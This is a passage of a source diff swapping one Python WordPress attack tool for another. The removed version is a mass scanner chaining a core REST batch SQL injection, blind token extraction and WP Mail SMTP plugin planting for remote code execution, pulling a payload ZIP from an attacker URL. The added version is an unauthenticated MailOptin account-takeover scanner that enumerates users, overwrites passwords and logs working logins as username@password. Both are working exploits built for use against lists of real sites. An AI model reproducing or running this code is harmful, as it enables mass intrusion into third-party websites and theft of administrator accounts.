@@ -1,1283 +1,1505 @@
-"""WP-core batch-confusion SQLi -> WP Mail SMTP raw-token gate -> RCE  |  GENERAL
-scanner, single self-contained file. It embeds the complete verified engine (the exact
-code proven byte-exact against the local WordPress 7.0.1 lab) plus its CLI: copy this one
-file anywhere - NO Python dependencies beyond the standard library, NO sibling files.
-
-What it does, per target (all self-discovered, nothing assumed):
-  * REST batch endpoint sanity across candidate URLs (index.php?rest_route= / ?rest_route= /
-    wp-json/batch/v1 ...) with POST-preserving redirects (http->https hosts stay intact)
-  * oracle self-check on 1=1/1=2 with a row channel that survives draft-only content and
-    author-id-0 imports (status=any, NOT IN (-1)); zero-row installs report why instead
-    of hanging
-  * SQL dialect auto-detection (sqlite vs mysql/mariadb) and any $table_prefix discovery
-    (candidate list, then metadata enumeration) - read the siteurl row to verify
-  * blind token extraction with probes PACKED ~12-per-HTTP-request inside one outer batch
-    (the core 'at most N items' cap is auto-learned) and independent batch frames in
-    parallel (--threads, default 2): a 128-char token is ~100 HTTP requests total
-  * raw-token wp_mail_smtp_connect_process fire (plugin 2.6-3.8.x; 3.9.0+ reports
-    gate_rejected - HMAC family), structural analysis of any reply (json/html/zero-body/
-    statuses -> verdict), and far-side ground truth through the SAME SQLi: the token row
-    must be gone and the planted plugin slug active in active_plugins
-
-Scanning (recommended - run it and answer the two prompts, sites-list .txt and payload ZIP):
-  python poc_sqli_wpms_general.py
-Non-interactive:
-  python poc_sqli_wpms_general.py --sites list.txt --url-zip http://attacker/h.zip
-  python poc_sqli_wpms_general.py --target https://victim --url-zip http://attacker/h.zip
-Every host proven exploitable is appended to vuln.txt ([CONFIRMED] <host>) as soon as it
-is proven, one line per hit, flushed immediately. --no-fire extracts only and appends
-nothing.
-
-Honest limits: the MySQL payload set is implemented but lab-verified only on SQLite; the
-final verdict is the far side (token row gone + plugin active), the server message is
-informational only.
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
+MailOptin - unauthenticated WordPress account takeover, multi-target.
 
-"""Shared engine for the WP-core batch-confusion SQLi -> WP Mail SMTP RCE PoC.
+    pip install aiohttp rich
+    python work\poc_ultimate.py
 
-Self-discovering, self-verifying, and fast:
+Run with no arguments: it asks for the path to a list of target URLs and for
+the thread count. Every prompt has a default, --yes skips them.
 
-  1. Oracle self-check  (batch confusion must answer TRUE/FALSE on 1=1 / 1=2)
-  2. Dialect discovery   mysql | sqlite (auto via sqlite_master / DUAL markers)
-  3. Options-table discovery (any dynamic table prefix: candidate list, then
-     sqlite_master / information_schema enumeration, verified via siteurl)
-4. Blind option extraction. Two engine paths:
-        - fast path  (default): independent probes are PACKED into one outer REST batch
-          frame [primer, {posts(batch), batch} * K] (K auto-bounded by the core's
-          "at most N items" per-request cap), so a whole 128-char token costs ~100 HTTP
-          round-trips (~2.5-3 min on the dev server);
-        - legacy path (fallback): one HTTP request per probe.
-      Both re-verify every character with an exact-equality round and re-extract
-      outliers on a larger code-point range when a value falls out of range.
-  5. Fire wp_mail_smtp_connect_process (raw oth token, WP Mail SMTP 2.6-3.8.x)
-     and ANALYZE the server answer structurally (json/html/zero-body/statuses,
-     success-flag variants of any shape, keyword sets -> verdict).
-  6. Post-fire ground truth is the far side, not the success message: the same
-     SQLi re-reads the token row (must be gone: one-shot) and active_plugins
-     (must list the planted slug). The server reply is informational.
+The list is one target per line - a URL or a bare host, scheme optional,
+'#' starts a comment:
 
-Confirmed live on WP 7.0.1 (SQLite drop-in) + WP Mail SMTP 3.8.0.
+    # sites.txt
+    https://example.com
+    example.org
+    http://10.0.0.5:8080/subdir
+
+Every hit is appended to the results file immediately, in one line:
+
+    https://example.com/wp-login.php#username@password
+
+There is NO username wordlist and none is needed. Usernames and user ids are
+discovered per target through WordPress itself, over four independent
+channels that run concurrently and are merged:
+
+    1  /wp-json/wp/v2/users?per_page=100&page=N   ids + slugs, 1 req / 100 users
+    2  /?rest_route=/wp/v2/users&per_page=100     same, for plain permalinks
+    3  /wp-sitemap-users-1.xml                    author slugs -> ?slug= lookup
+    4  /?author=N                                 canonical redirect, blind ids
+
+There is no "is this WordPress" pre-flight. The first request already does
+real work: it is the discovery call itself.
+
+--------------------------------------------------------------------------------
+WHAT IS EXPLOITED
+--------------------------------------------------------------------------------
+MailOptin registers its optin endpoint as a *nopriv* AJAX action, so it runs for
+anonymous visitors with no cookie, no nonce and no capability check:
+
+    AjaxHandler.php:43   wp_ajax_nopriv_{ subscribe_to_email_list }
+
+AbstractConnect::form_custom_field_mappings() (AbstractConnect.php:81-99)
+returns the mapping supplied by the REQUEST before it looks at the one the site
+owner saved:
+
+    if ( isset( $this->extras['form_custom_field_mappings'] ) ) {
+        return $this->extras['form_custom_field_mappings'];
+    }
+
+AjaxHandler.php:989 fills $extras from the whole payload, so an anonymous POST
+decides which wp_insert_user() fields get written (Subscription.php:36-40):
+
+    foreach ( $custom_field_mappings as $wp_field => $payload_key ) {
+        $user_fields[ $wp_field ] = esc_html( $this->extras[ $payload_key ] );
+    }
+
+Two primitives, both confirmed against a live WordPress install:
+
+  CREATE    user_login + user_pass, no ID  ->  wp_insert_user() inserts, and the
+             attacker owns an account whose name and password they chose.
+             Subscription.php:62 replaces a requested 'administrator' with the
+             new account's own role, so a fresh account is capped at the site
+             default role.
+
+  TAKEOVER  ID + user_pass  ->  wp_insert_user() takes the update path and
+             stores whatever arrived, so the password becomes the attacker's.
+             Asking for 'administrator' blanks the role, array_filter() drops
+             the key, and the victim KEEPS its own role - which is how an
+             administrator session survives.
+
+Why nothing has to be crawled:
+  * optin_uuid is not authoritative. AjaxHandler.php:705 takes the explicit
+    optin_campaign_id, never cross-checks it against the uuid, and never calls
+    is_activated(). Campaign ids are small integers, so they are counted.
+  * Campaign settings live in wp_options keyed by id, so a campaign whose
+    database row was deleted still executes.
+  * {"success":true} does NOT mean a user was written - a lead_bank_only
+    campaign answers exactly that before any connection runs. The JSON is never
+    treated as proof. The only oracle is a real login.
+
+--------------------------------------------------------------------------------
+HOW IT STAYS FAST
+--------------------------------------------------------------------------------
+  stage 1  ONE optin POST per (campaign, account). A write implies the
+           connection ran, which implies success:true, so every 500, every
+           success:false and every non-JSON reply dies here for the cost of the
+           single request it already took.
+  stage 2  login verification, only for stage-1 survivors, and it runs
+           SEQUENTIALLY per target: one wp-login.php POST, one admin screen,
+           one profile read. Sequential on purpose - concurrent logins on a
+           single cookie jar log each other out.
+           A single GET of /wp-admin/options-general.php separates all three
+           outcomes: 200 inside wp-admin is an administrator, 403 inside
+           wp-admin is a logged-in non-admin, a final URL of wp-login.php is
+           anonymous.
+
+Plus keep-alive connections, targets in parallel, and four adaptive behaviours
+described in CampaignMemory and run_site.
 """
-
+import argparse
 import asyncio
+import datetime
+import hashlib
+import html as html_lib
 import json
+import os
+import random
 import re
+import string
 import sys
-import threading
 import time
-import urllib.error
 import urllib.parse
-import urllib.request
-from concurrent.futures import ThreadPoolExecutor
+from dataclasses import dataclass, field
+from typing import Any, Dict, List, Optional, Sequence, Tuple
+
+try:
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.table import Table
+    from rich.progress import (Progress, SpinnerColumn, TextColumn, BarColumn,
+                               TimeElapsedColumn, MofNCompleteColumn)
+    from rich import box
+    RICH = True
+except Exception:
+    RICH = False
 
 try:
     import aiohttp
-    HAS_AIOHTTP = True
-except Exception:  # pragma: no cover - optional accelerator
-    aiohttp = None
-    HAS_AIOHTTP = False
+except Exception:
+    sys.stderr.write("[!] pip install aiohttp rich\n")
+    sys.exit(2)
+
+# A legacy Windows console can default to a code page such as cp1256 that cannot
+# encode what Rich draws, which kills the run mid-print.
+for _stream in (sys.stdout, sys.stderr):
+    try:
+        _stream.reconfigure(encoding="utf-8", errors="replace")
+    except Exception:
+        pass
+
+SPINNER = "line"           # ASCII only, safe on any code page
+STARTED = time.time()
 
 
-class ProbeError(RuntimeError):
-    pass
+# =============================================================================
+# phpass - byte-exact port of wp-includes/class-phpass.php
+# =============================================================================
+
+ITOA64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
 
 
-class CampaignAbort(ProbeError):
-    pass
+def _encode64(data: bytes, count: int) -> str:
+    if not data:
+        return ""
+    out = []
+    n = len(data)
+    i = 0
+    while True:
+        value = data[i % n]
+        i += 1
+        out.append(ITOA64[value & 0x3F])
+        if i < count:
+            value |= data[i % n] << 8
+        out.append(ITOA64[(value >> 6) & 0x3F])
+        if i >= count:
+            break
+        i += 1
+        if i < count:
+            value |= data[i % n] << 16
+        out.append(ITOA64[(value >> 12) & 0x3F])
+        if i >= count:
+            break
+        i += 1
+        out.append(ITOA64[(value >> 18) & 0x3F])
+        if i >= count:
+            break
+    return "".join(out)
 
 
-def urlq(s):
-    return urllib.parse.quote(s, safe="")
+def _crypt_private(password: str, setting: str) -> str:
+    if setting[:3] not in ("$P$", "$H$"):
+        return "*0"
+    count_log2 = ITOA64.find(setting[3])
+    if count_log2 < 7 or count_log2 > 30:
+        return "*1"
+    count = 1 << count_log2
+    salt = setting[4:12]
+    if len(salt) != 8:
+        return "*1"
+    pw = password.encode("utf-8")
+    digest = hashlib.md5(salt.encode("ascii") + pw).digest()
+    for _ in range(count):
+        digest = hashlib.md5(digest + pw).digest()
+    return setting[:12] + _encode64(digest, 16)
 
 
-def sq(name):
-    return "'%s'" % name.replace("\\", "\\\\").replace("'", "''")
+def phpass_hash(password: str) -> str:
+    for _ in range(10):
+        setting = "$P$B" + _encode64(os.urandom(6), 6)
+        result = _crypt_private(password, setting)
+        if len(result) == 34 and not result.startswith("*"):
+            return result
+    raise RuntimeError("phpass_hash failed")
 
 
-class _PreserveRedirect(urllib.request.HTTPRedirectHandler):
-    """Follow 301/302/303/307/308 re-issuing the SAME method+body (urllib otherwise
-    demotes POST to GET on 301/302/303, silently losing the batch payload)."""
-
-    def redirect_request(self, req, fp, code, msg, headers, newurl):
-        method = req.get_method()
-        data = req.data
-        if data and method == "POST":
-            newheaders = {k: v for k, v in req.headers.items()}
-            newheaders["Content-Length"] = str(len(data))
-            return urllib.request.Request(newurl, data=data, method=method, headers=newheaders)
-        return urllib.request.Request(newurl, headers={k: v for k, v in req.headers.items()})
+PHPASS_VECTORS = [
+    ("password", "$P$BjAHG3xmA", "$P$BjAHG3xmAhzDfA7wdySMMuMcGEjjUS1"),
+    ("hunter2", "$P$BkQHK3/nB", "$P$BkQHK3/nBW/bTBuNutkxgvml3bPL/t1"),
+    ("Tr0ub4dor&3", "$P$Bl6oP33XE", "$P$Bl6oP33XEd0Lr/YvYqaheCCgfAyyo51"),
+    ("", "$P$BmMYA47XF", "$P$BmMYA47XFTl2E7UD75Dg24jWlPNnql."),
+    ("a", "$P$BncIG4BXG", "$P$BncIG4BXGPPGVI62lujhKX/AxR.SXK1"),
+    ("p@ss w0rd!", "$P$BosIK4FXH", "$P$BosIK4FXHtuNgEwvnqf1wUMBZT5.Tf0"),
+]
 
 
+def phpass_selftest() -> bool:
+    """Never send a hash WordPress might not accept."""
+    for password, setting, expected in PHPASS_VECTORS:
+        if _crypt_private(password, setting) != expected:
+            return False
+    probe = phpass_hash("round trip")
+    return probe.startswith("$P$B") and len(probe) == 34
+
+
+# =============================================================================
+# constants
+# =============================================================================
+
+UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
+AJAX_ACTION = "subscribe_to_email_list"
+WPCONN = "WordPressUserRegistrationConnect"
+LOGIN_PATH = "/wp-login.php"
+
+# The single screen used to classify a session. Measured against a logged-in
+# EDITOR: options-general.php, users.php, plugins.php, themes.php and
+# options-reading.php all answer 403, while tools.php, index.php and edit.php
+# answer 200. Only a 200 from options-general.php counts as proof, because
+# tools.php and index.php render for any subscriber and would hand out a
+# completely fictional "administrator verified".
+ADMIN_PROBE = "/wp-admin/options-general.php"
+PROFILE_PATH = "/wp-admin/profile.php"
+ADMIN_USERS_PATH = "/wp-admin/users.php"
+# WordPress lists 20 accounts per page by default; only used to stop paging.
+ADMIN_USERS_PER_PAGE = 20
+
+ANON, MEMBER, ADMIN = "anonymous", "member", "administrator"
+
+BRACKET_RE = re.compile(r"[\[{]")
+AUTHOR_RE = re.compile(r"/author/([^/?#]+)/?$")
+SITEMAP_LOC_RE = re.compile(r"<loc>\s*([^<]*?/author/([^/<]+)/?)\s*</loc>")
+
+# profile.php carries the authoritative values. Each is tried in several shapes
+# because the markup differs between WordPress versions and themes.
+RE_USER_LOGIN = re.compile(
+    r'id=["\']user_login["\'][^>]*value=["\']([^"\']+)["\']', re.I)
+RE_USER_LOGIN_ALT = re.compile(
+    r'value=["\']([^"\']+)["\'][^>]*id=["\']user_login["\']', re.I)
+# Some security plugins strip the id but leave the name, and a few themes render
+# the field through a helper that only keeps one of the two.
+RE_USER_LOGIN_NAME = re.compile(
+    r'name=["\']user_login["\'][^>]*value=["\']([^"\']+)["\']', re.I)
+RE_USER_LOGIN_NAME_ALT = re.compile(
+    r'value=["\']([^"\']+)["\'][^>]*name=["\']user_login["\']', re.I)
+RE_EMAIL = re.compile(r'id=["\']email["\'][^>]*value=["\']([^"\']+)["\']', re.I)
+RE_NICKNAME = re.compile(
+    r'id=["\']nickname["\'][^>]*value=["\']([^"\']*)["\']', re.I)
+RE_USER_ID = re.compile(r'name=["\']checkuser_id["\'][^>]*value=["\'](\d+)["\']',
+                         re.I)
+
+# wp-admin/users.php is the only page that states the real user_login for EVERY
+# account, and a takeover session can already read it. Quote style varies between
+# WordPress versions (7.x emits <tr id='user-2'>), so both are accepted.
+USERS_ROW_RE = re.compile(
+    r"<tr\s+id=['\"]user-(\d+)['\"][^>]*>(.*?)</tr>", re.I | re.S)
+USERS_NAME_RES = (
+    re.compile(r"<span[^>]*class=['\"][^'\"]*\busername\b[^'\"]*['\"][^>]*>"
+               r"([^<]+?)<", re.I),
+    re.compile(r"aria-label=['\"]([^'\"]+)['\"][^>]*data-colname=['\"]Username",
+               re.I),
+    re.compile(r"data-colname=['\"]Username['\"][^>]*aria-label=['\"]([^'\"]+)",
+               re.I),
+    re.compile(r"Select\s+([^<]+?)\s*</span>", re.I),
+)
+
+# A reply this shape means the AJAX action does not exist on the target.
+DEAD_STATUS = (400, 401, 403, 404, 405, 500, 501)
+
+
+def now_iso() -> str:
+    return datetime.datetime.now().isoformat(timespec="seconds")
+
+
+def random_token(count: int = 13) -> str:
+    alphabet = string.ascii_letters + string.digits
+    return "".join(random.choice(alphabet) for _ in range(count))
+
+
+def slugify(text: str, limit: int = 14) -> str:
+    return re.sub(r"\W", "_", text)[:limit].strip("_") or "target"
+
+
+def parse_json_loose(text: Optional[str]) -> Optional[Any]:
+    """
+    Parse JSON that may be preceded by junk.
+
+    PHP's built-in server, and plenty of real hosts, prepend deprecation
+    notices, warnings or a BOM to the body, so trusting offset 0 loses the
+    response. Notice text also carries its own brackets - PHP's own warning
+    quotes $_SERVER['argv'] - so the first "[" is regularly a dead end and the
+    first "{" is regularly the inner object of a list whose "]" got skipped.
+    Every bracket is tried; the decode that consumes the whole body wins.
+    """
+    if not text:
+        return None
+    decoder = json.JSONDecoder()
+    partial: Optional[Any] = None
+    seen = 0
+    for match in BRACKET_RE.finditer(text):
+        idx = match.start()
+        try:
+            value, end = decoder.raw_decode(text[idx:])
+        except ValueError:
+            continue
+        seen += 1
+        if text[idx + end:].strip() == "":
+            return value
+        if partial is None:
+            partial = value
+        if seen >= 64:
+            break
+    return partial
+
+
+# =============================================================================
+# models
+# =============================================================================
+
+@dataclass
 class Target:
-    def __init__(self, base, timeout=60.0, retries=2):
-        base = (base or "").strip()
-        if base and "://" not in base:
-            base = "http://" + base
-        self.base = base.rstrip("/")
-        self.timeout = timeout
-        self.retries = retries
-        self.req_no = 0
-        self._lock = threading.Lock()
-        self.batch = None
-        self.ajax = None
-        self._opener = urllib.request.build_opener(_PreserveRedirect())
+    base: str
+    scheme: str
+    host: str
+    port: int
+    netloc: str
+    prefix: str
 
-    def batch_path(self):
-        if self.batch:
-            return self.batch
-        return self.base + "/index.php?rest_route=/batch/v1"
-
-    def ajax_path(self):
-        if self.ajax:
-            return self.ajax
-        return self.base + "/wp-admin/admin-ajax.php"
-
-    def _request(self, url, data, headers):
-        last = None
-        for attempt in range(1 + self.retries):
-            req = urllib.request.Request(url, data=data, headers=headers)
-            try:
-                with self._opener.open(req, timeout=self.timeout) as r:
-                    return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
-            except urllib.error.HTTPError as e:
-                return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
-            except Exception as exc:
-                last = exc
-                time.sleep(0.6 * attempt)
-        raise ProbeError("http request failed: %r" % (last,))
-
-    def count_request(self):
-        with self._lock:
-            self.req_no += 1
-
-    def post(self, url, payload, form=False):
-        self.count_request()
-        if form:
-            data = urllib.parse.urlencode(payload).encode()
-            headers = {"Content-Type": "application/x-www-form-urlencoded"}
-        else:
-            data = json.dumps(payload).encode()
-            headers = {"Content-Type": "application/json"}
-        st, _, body = self._request(url, data, headers)
-        return st, body
-
-    def post_raw(self, url, payload, form=False):
-        self.count_request()
-        if form:
-            data = urllib.parse.urlencode(payload).encode()
-            headers = {"Content-Type": "application/x-www-form-urlencoded"}
-        else:
-            data = json.dumps(payload).encode()
-            headers = {"Content-Type": "application/json"}
-        return self._request(url, data, headers)
-
-    def request_count(self):
-        with self._lock:
-            return self.req_no
-
-
-class SQLiSink:
-    def __init__(self, target, dialect="sqlite", prefix=None, length=None, threads=1,
-                 transport="auto"):
-        self.t = target
-        self.dialect = dialect.lower()
-        if self.dialect == "mysql":
-            self.sub, self.cp = "SUBSTRING", "ord"
-        else:
-            self.sub, self.cp = "SUBSTR", "unicode"
-        self.prefix = prefix
-        self.length_opt = length
-        self.multi_batch = 12
-        self.status = None
-        self._multi = None
-        self.threads = max(1, int(threads))
-        self.transport = transport
-        self._lock = threading.Lock()
+    def abs(self, path: str) -> str:
+        """Absolute URL for a site-relative path, honouring a sub-directory
+        install prefix (https://host/blog/ + /wp-login.php)."""
+        if "://" in path:
+            return path
+        if not path.startswith("/"):
+            path = "/" + path
+        return self.base + path
 
     @property
-    def use_aio(self):
-        return self.transport in ("auto", "aio") and HAS_AIOHTTP
-
-    def ident(self, name):
-        if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", name):
-            return name
-        if self.dialect == "sqlite":
-            return '"' + name.replace('"', '""') + '"'
-        return "`" + name.replace("`", "``") + "`"
-
-    def table(self, suffix):
-        if self.prefix is None:
-            raise CampaignAbort("no database prefix resolved")
-        return self.ident(self.prefix + suffix)
-
-    def option_row(self, col, name, order="LIMIT 1"):
-        return "(SELECT %s FROM %s WHERE option_name=%s %s)" % (
-            col, self.table("options"), sq(name), order)
-
-    @staticmethod
-    def _cond(cond):
-        return "-1) AND (CASE WHEN (%s) THEN 1 ELSE 0 END) -- -" % cond
-
-    def _inner_requests(self, author_exclude):
-        path = "/wp/v2/categories?author_exclude=" + urlq(author_exclude)
-        if self.status:
-            path += "&status=" + urlq(self.status)
-        return {
-            "requests": [
-                {"path": "http://"},
-                {"method": "GET", "path": path},
-                {"method": "GET", "path": "/wp/v2/posts"},
-            ]
-        }
-
-    def _walk_bool(self, responses, index, ctx):
-        try:
-            rows = responses[index]["body"]["responses"][1]["body"]
-            return isinstance(rows, list) and len(rows) > 0
-        except (KeyError, IndexError, TypeError):
-            raise ProbeError("unexpected batch shape (%s): %s" % (ctx, json.dumps(responses[0:4])[:240]))
-
-    def probe_one(self, author_exclude):
-        outer = {"requests": [
-            {"path": "http://"},
-            {"method": "POST", "path": "/wp/v2/posts", "body": self._inner_requests(author_exclude)},
-            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
-        ]}
-        st, text = self.t.post(self.t.batch_path(), outer)
-        try:
-            j = json.loads(text)
-            return self._walk_bool(j["responses"], 1, "single")
-        except (KeyError, IndexError, TypeError, ValueError):
-            raise ProbeError("unexpected batch response (patched core? wrong --target?): HTTP %s %s"
-                             % (st, text[:160]))
-
-    class _SizeNeeded(Exception):
-        def __init__(self, nb):
-            super().__init__("batch limit learned: %d" % nb)
-            self.nb = nb
-
-    def _build_frame(self, part):
-        blocks = [{"path": "http://"}]
-        for p in part:
-            blocks.append({"method": "POST", "path": "/wp/v2/posts",
-                           "body": self._inner_requests(p)})
-            blocks.append({"method": "POST", "path": "/batch/v1", "body": {"requests": []}})
-        return {"requests": blocks}
-
-    def _parse_frame(self, st, text, size):
-        """Shared response parser (identical for the aiohttp and urllib transports).
-
-        Raises _SizeNeeded when the core reports a stricter per-request item cap,
-        ProbeError for any other malformed shape."""
-        try:
-            j = json.loads(text)
-            return [self._walk_bool(j["responses"], 1 + 2 * k, "multi") for k in range(size)]
-        except (KeyError, IndexError, TypeError, ValueError):
-            m = re.search(r"at most (\d+) items", text)
-            if m:
-                nb = max(1, (int(m.group(1)) - 1) // 2)
-                if nb < size:
-                    raise self._SizeNeeded(nb)
-            raise ProbeError("packed batch parse failed (HTTP %s, %d probes): %s"
-                             % (st, size, text[:200]))
-
-    def _eval_frame(self, part, size):
-        """POST one packed frame of `part` (len == size) over urllib, returning its booleans."""
-        st, text = self.t.post(self.t.batch_path(), self._build_frame(part))
-        return self._parse_frame(st, text, size)
-
-    def probe_many(self, payloads):
-        if not payloads:
-            return []
-        chunks = [payloads[i:i + self.multi_batch] for i in range(0, len(payloads), self.multi_batch)]
-
-        def run(chunk):
-            out = []
-            rest = chunk
-            while rest:
-                size = min(len(rest), self.multi_batch)
-                part = rest[:size]
-                try:
-                    got = self._eval_frame(part, size)
-                except self._SizeNeeded as nb:
-                    with self._lock:
-                        if nb.nb < self.multi_batch:
-                            self.multi_batch = nb.nb
-                    continue
-                out.extend(got)
-                rest = rest[size:]
-            return out
-
-        if self.use_aio:
-            try:
-                return asyncio.run(self._probe_many_aio(chunks))
-            except Exception:
-                pass
-        n = len(chunks)
-        if self.threads > 1 and n > 1:
-            with ThreadPoolExecutor(max_workers=min(self.threads, n)) as ex:
-                results = list(ex.map(run, chunks))
-        else:
-            results = [run(c) for c in chunks]
-        return [v for r in results for v in r]
-
-    async def _aio_post_preserve(self, session, url, frame):
-        """POST with redirects that preserve the method+body (aiohttp's default follows
-        browser semantics and would demote POST to GET on 301/302/303)."""
-        last = None
-        for attempt in range(1 + self.t.retries):
-            target = url
-            try:
-                for _hops in range(6):
-                    async with session.post(target, json=frame, allow_redirects=False) as resp:
-                        if resp.status in (301, 302, 303, 307, 308) and resp.headers.get("Location"):
-                            target = urllib.parse.urljoin(target, resp.headers["Location"])
-                            continue
-                        self.t.count_request()
-                        return resp.status, await resp.text()
-                raise ProbeError("too many redirects")
-            except asyncio.TimeoutError as exc:
-                last = exc
-                await asyncio.sleep(0.5 * attempt)
-            except aiohttp.ClientError as exc:
-                last = exc
-                await asyncio.sleep(0.5 * attempt)
-        raise ProbeError("http request failed: %r" % (last,))
-
-    async def _probe_many_aio(self, chunks):
-        sem = asyncio.Semaphore(self.threads)
-        timeout = aiohttp.ClientTimeout(total=self.t.timeout)
-        connector = aiohttp.TCPConnector(limit=self.threads * 4, enable_cleanup_closed=True)
-        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-            async def run_chunk(chunk):
-                out = []
-                rest = chunk
-                while rest:
-                    size = min(len(rest), self.multi_batch)
-                    part = rest[:size]
-                    async with sem:
-                        st, text = await self._aio_post_preserve(
-                            session, self.t.batch_path(), self._build_frame(part))
-                    try:
-                        got = self._parse_frame(st, text, size)
-                    except self._SizeNeeded as nb:
-                        with self._lock:
-                            if nb.nb < self.multi_batch:
-                                self.multi_batch = nb.nb
-                        continue
-                    out.extend(got)
-                    rest = rest[size:]
-                return out
-            results = await asyncio.gather(*[run_chunk(c) for c in chunks])
-        return [v for r in results for v in r]
-
-    def multi_ok(self):
-        if self._multi is None:
-            try:
-                want = [self._cond(c) for c in ("1=1", "1=2", "1=1")]
-                self._multi = self.probe_many(want) == [True, False, True]
-            except ProbeError:
-                self._multi = False
-        return self._multi
-
-    def expr_probe(self, cond):
-        return self.probe_one(self._cond(cond))
-
-    def expr_probe_many(self, conds):
-        return self.probe_many([self._cond(c) for c in conds])
-
-    def char_ge(self, sub, pos, val):
-        return "-1) AND (CASE WHEN (SELECT %s(%s(%s,%d,1)))>=%d THEN 1 ELSE 0 END) -- -" % (
-            self.cp, self.sub, sub, pos, val)
-
-    def char_eq(self, sub, pos, ch):
-        return "-1) AND (CASE WHEN (SELECT %s(%s(%s,%d,1)))=%d THEN 1 ELSE 0 END) -- -" % (
-            self.cp, self.sub, sub, pos, ord(ch))
-
-    def _bisect(self, cond_of_mid, lo, hi):
-        lo, hi = int(lo), int(hi)
-        while lo < hi:
-            mid = (lo + hi + 1) // 2
-            if self.expr_probe(cond_of_mid(mid)):
-                lo = mid
-            else:
-                hi = mid - 1
-        return lo
-
-    def scalar_length(self, sub, lo=0, hi=4096):
-        return self._bisect(lambda m: "(SELECT length(%s))>=%d" % (sub, m), lo, hi)
-
-    def extract_chars_batch(self, sub, length, lo=32, hi=126, progress=None):
-        curs = {p: (lo, hi) for p in range(1, length + 1)}
-        while True:
-            pending = {p: q for p, q in curs.items() if q[0] < q[1]}
-            if not pending:
-                break
-            mids = [(p, (l + h + 1) // 2) for p, (l, h) in pending.items()]
-            vals = self.probe_many([self.char_ge(sub, p, m) for p, m in mids])
-            for (p, m), ok in zip(mids, vals):
-                l, h = pending[p]
-                curs[p] = (m, h) if ok else (l, m - 1)
-            if progress:
-                progress(length - len({p for p, q in curs.items() if q[0] < q[1]}))
-        chars = {p: chr(q[0]) for p, q in curs.items()}
-        ok = self.probe_many([self.char_eq(sub, p, chars[p]) for p in range(1, length + 1)])
-        good = [p for p, o in zip(range(1, length + 1), ok) if o]
-        bad = [p for p in range(1, length + 1) if p not in good]
-        if bad:
-            redo = {p: 255 if self.dialect == "mysql" else 0x10FFFF for p in bad}
-            rounds = 0
-            while bad and rounds < 3:
-                rounds += 1
-                self._refine_range(sub, curs, bad, redo)
-                ok2 = self.probe_many([self.char_eq(sub, p, chars[p]) for p in bad])
-                good = [p for p, o in zip(bad, ok2) if o]
-                bad = [p for p in bad if p not in good]
-                for p in bad:
-                    redo[p] = 0x10FFFF
-            if bad:
-                raise ProbeError("characters %s out of the SQLi code-point range and unverifiable"
-                                 % bad)
-        return "".join(chars[p] for p in range(1, length + 1))
-
-    def _refine_range(self, sub, curs, positions, hi_map):
-        pending = {p: (curs[p][0], hi_map[p]) for p in positions}
-        while True:
-            act = {p: q for p, q in pending.items() if q[0] < q[1]}
-            if not act:
-                break
-            mids = [(p, (l + h + 1) // 2) for p, (l, h) in act.items()]
-            vals = self.probe_many([self.char_ge(sub, p, m) for p, m in mids])
-            for (p, m), ok in zip(mids, vals):
-                l, h = act[p]
-                pending[p] = (m, h) if ok else (l, m - 1)
-        for p in positions:
-            curs[p] = (pending[p][0], pending[p][0])
-
-    def scalar(self, sub, length=None, threads=1, progress=None, narrow_hex=True):
-        if threads and int(threads) > self.threads:
-            self.threads = int(threads)
-        if not length and self.length_opt:
-            length = self.length_opt
-        if not length:
-            length = self.scalar_length(sub)
-        if length <= 0:
-            return ""
-        if self.multi_ok():
-            got = self.extract_chars_batch(sub, length, progress=progress)
-            if progress:
-                progress(length)
-            return got
-        out = []
-        for pos in range(1, length + 1):
-            c = self._char_legacy(sub, pos)
-            out.append(c)
-            if progress:
-                progress(len(out))
-        return "".join(out)
-
-    def _char_legacy(self, sub, pos):
-        v = self._bisect(lambda m: self.char_ge(sub, pos, m), 32, 126)
-        if not self.expr_probe(self.char_eq(sub, pos, chr(v))):
-            v = self._bisect(lambda m: self.char_ge(sub, pos, m), 32, 0x10FFFF)
-        return chr(v)
+    def login_url(self) -> str:
+        return self.base + LOGIN_PATH
 
 
-class Discovery:
-    def __init__(self, sink):
-        self.s = sink
+def parse_target(url: str) -> Optional[Target]:
+    raw = (url or "").strip().lstrip("\ufeff").strip()
+    if not raw:
+        return None
+    if "://" not in raw:
+        raw = "http://" + raw
+    try:
+        parts = urllib.parse.urlsplit(raw)
+        port = parts.port or (443 if parts.scheme == "https" else 80)
+    except ValueError:
+        return None
+    if not parts.hostname or not parts.netloc:
+        return None
+    prefix = parts.path.rstrip("/")
+    return Target("%s://%s%s" % (parts.scheme, parts.netloc, prefix),
+                  parts.scheme, parts.hostname, port, parts.netloc, prefix)
 
-    def endpoints(self):
-        t = self.s.t
-        if t.batch is None:
-            cand = [
-                t.base + "/index.php?rest_route=/batch/v1",
-                t.base + "/?rest_route=/batch/v1",
-                t.base + "/wp-json/batch/v1",
-                t.base + "/index.php/rest_route=/batch/v1",
-            ]
-            ok = None
-            for url in cand:
-                try:
-                    st, body = t.post(url, {"requests": []})
-                except ProbeError:
-                    continue
-                try:
-                    j = json.loads(body.lstrip("\ufeff \t\r\n"))
-                except ValueError:
-                    continue
-                if isinstance(j, dict) and ("responses" in j or "failed" in j or "code" in j):
-                    ok = url
-                    break
-            if ok is None:
-                raise CampaignAbort(
-                    "REST batch endpoint not reachable as JSON (tested %d candidate URLs). "
-                    "Is the target WordPress 5.6+ with the REST API enabled, or is a "
-                    "proxy/WAF/security plugin blocking /batch/v1 or index.php?rest_route=?"
-                    % len(cand))
-            t.batch = ok
-        if t.ajax is None:
-            t.ajax = t.base + "/wp-admin/admin-ajax.php"
-        return t.batch
 
-    def rest_is_json(self):
-        try:
-            self.endpoints()
-            return True
-        except CampaignAbort:
+@dataclass
+class UserRec:
+    uid: int
+    names: List[str] = field(default_factory=list)
+    sources: List[str] = field(default_factory=list)
+
+    def add_name(self, name: Optional[str], source: str) -> None:
+        name = (name or "").strip()
+        if name and name not in self.names:
